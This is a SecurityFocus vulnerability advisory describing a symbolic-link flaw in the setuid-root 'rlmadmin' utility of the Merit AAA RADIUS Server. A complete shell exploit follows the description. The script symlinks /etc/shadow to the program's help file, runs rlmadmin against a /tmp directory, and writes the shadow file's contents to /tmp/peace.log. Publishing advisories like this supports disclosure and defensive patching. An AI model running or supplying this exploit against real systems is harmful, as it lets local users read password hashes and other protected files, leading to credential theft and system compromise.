source: http://www.securityfocus.com/bid/3302/info


The 'rlmadmin' user management utility included with the Merit AAA RADIUS Server package is susceptible to a trivial symbolic link attack. The program allows users to specify a directory from which configuration files should be loaded at runtime. A help file, 'rlmadmin.help', is loaded from this directory and displayed directly to the user when the program is run.

The vulnerability exists because the program is setuid root and does not check if the help file is symbolically linked before displaying its contents to the user. As a local user, it is trivial for a local user to read any file on the system. This may lead to the disclosure of sensitive data and system compromise. 

#!/bin/sh
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- #
# rlmadmin view file symlink vulnerability #
# (c)oded 2001 Digital Shadow #
# www.ministryofpeace.co.uk #
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- #
bloc=/usr/private/etc # executable file location
cloc=/usr/private/etc/raddb # config file location
file=/etc/shadow # file to read
echo == rlmadmin exploit - visit www.ministryofpeace.co.uk for more!
echo = Initialising...
mkdir /tmp/peace; cd /tmp/peace
cp $cloc/dictionary $cloc/vendors .
ln -s $file rlmadmin.help
echo = Exploiting...
echo quit | $bloc/rlmadmin -d /tmp/peace > peace.log
mv peace.log /tmp; rm dictionary rlmadmin.help vendors
echo = Done!
echo == Now look in /tmp/peace.log! 